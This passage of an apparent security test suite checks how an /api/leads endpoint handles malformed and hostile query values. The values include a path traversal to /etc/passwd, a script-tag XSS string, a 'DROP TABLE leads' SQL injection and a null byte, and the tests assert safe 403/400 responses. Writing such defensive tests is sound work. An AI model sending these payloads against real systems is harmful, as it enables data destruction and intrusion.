  it('H1: GET /api/leads with workspaceId=../../../etc/passwd → 403 (not path traversal)', async () => {
    const r = await server.request('/api/leads?workspaceId=../../../etc/passwd', {
      headers: { Authorization: bearer(USER_A) },
    })
    // workspaceId is used as a DB lookup key, not a file path — membership check returns null → 403
    assert.equal(r.status, 403, `Expected 403, got ${r.status}`)
    assert.notEqual(r.status, 500)
  })

  it('H2: GET /api/leads with workspaceId=<script>alert(1)</script> → 403 (membership fails)', async () => {
    const r = await server.request('/api/leads?workspaceId=%3Cscript%3Ealert(1)%3C/script%3E', {
      headers: { Authorization: bearer(USER_A) },
    })
    assert.equal(r.status, 403)
    // Response is JSON, not HTML — script cannot execute
    assert.ok(
      JSON.stringify(r.body).includes('"error"') || r.status === 403,
      'Response must be structured JSON'
    )
  })

  it('H3: GET /api/leads with stage SQL injection payload → not 500', async () => {
    const r = await server.request(
      `/api/leads?workspaceId=${WS_A}&stage=%27%3B%20DROP%20TABLE%20leads%3B--`,
      { headers: { Authorization: bearer(USER_A) } }
    )
    // Prisma parameterizes queries — SQL injection in filter values is inert
    assert.notEqual(r.status, 500, `Must not 500 on SQL injection in stage param`)
  })

  it('H4: GET /api/leads with workspaceId as empty string → 400', async () => {
    const r = await server.request('/api/leads?workspaceId=', {
      headers: { Authorization: bearer(USER_A) },
    })
    assert.equal(r.status, 400)
  })

  it('H5: GET /api/leads with workspaceId containing null byte → 403 (workspace not found)', async () => {
    // Null bytes can be used to truncate strings in C-based backends; here they pass through
    const r = await server.request('/api/leads?workspaceId=valid%00injected', {
      headers: { Authorization: bearer(USER_A) },
    })
    // workspaceId 'valid\x00injected' != WS_A → membership fails → 403
    assert.equal(r.status, 403)
    assert.notEqual(r.status, 500)
  })

  it('H6: GET /api/leads with very long workspaceId (10KB) → not 500', async () => {
    const longId = 'A'.repeat(10_000)
    const r = await server.request(`/api/leads?workspaceId=${longId}`, {
      headers: { Authorization: bearer(USER_A) },
    })
    // Membership lookup returns null for this ID → 403
    assert.ok(r.status === 403 || r.status === 400, `Got ${r.status}`)
    assert.notEqual(r.status, 500)
  })

  it('H7: GET /api/leads with search containing LIKE wildcard blast → not 500', async () => {
    // Thousands of % chars could cause DB performance issues but must not crash
    const wildcards = '%'.repeat(1000)
    const r = await server.request(
      `/api/leads?workspaceId=${WS_A}&search=${encodeURIComponent(wildcards)}`,
      { headers: { Authorization: bearer(USER_A) } }
    )
    assert.notEqual(r.status, 500)
  })

  it('H8: GET /api/leads?page=-1 → coerced to 1, not 500', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}&page=-1`, {
      headers: { Authorization: bearer(USER_A) },
    })
    assert.notEqual(r.status, 500)
    // Math.max(1, -1) = 1 so it runs normally
    assert.equal(r.status, 200)
  })

  it('H9: GET /api/leads?limit=999999 → clamped to 100, not 500', async () => {
    const r = await server.request(`/api/leads?workspaceId=${WS_A}&limit=999999`, {
      headers: { Authorization: bearer(USER_A) },
    })
    assert.equal(r.status, 200)
    assert.ok(r.body?.limit <= 100, `limit should be clamped to 100, got ${r.body?.limit}`)
  })

  it('H10: POST /api/leads with non-object body (array) → not 500', async () => {
    const r = await server.request('/api/leads', {
      method: 'POST',
      headers: { Authorization: bearer(USER_A), 'Content-Type': 'application/json' },
      body: JSON.stringify([{ businessName: 'Test' }]),
    })
    // Body is an array not an object — workspaceId is missing → 400
    assert.equal(r.status, 400)
    assert.notEqual(r.status, 500)
  })
})
